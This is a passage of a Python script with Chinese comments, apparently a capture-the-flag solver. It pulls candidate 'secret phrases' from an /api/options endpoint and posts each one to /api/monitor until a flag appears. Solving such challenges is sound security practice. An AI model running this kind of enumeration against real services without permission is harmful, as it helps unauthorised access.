        options = resp.json()
    except Exception as e:
        print(f"[-] Failed to fetch /api/options: {e}")
        sys.exit(1)

    commands = None
    if isinstance(options, dict):
        # 假设返回格式为 {"commands": [...]} 或类似
        for key in ['commands', 'data', 'options']:
            if key in options:
                commands = options[key]
                break
    if not commands and isinstance(options, list):
        commands = options

    if not commands:
        print("[-] Could not extract command list from response")
        sys.exit(1)

    print(f"[*] Found {len(commands)} potential secret phrases")

    # 第二步：尝试每个命令，发送到 /api/monitor 直到获得 flag
    flag = None
    for cmd in commands:
        try:
            resp = client.post("/api/monitor", json={"command": cmd})
            resp.raise_for_status()
            data = resp.json()
        except Exception as e:
            print(f"[-] Error trying command '{cmd}': {e}")
            continue

        # 检查是否返回了 flag（假设 flag 包含在某个字段中，如 "message" 或 "flag"）
        message = None
        if isinstance(data, dict):
            # 常见 key
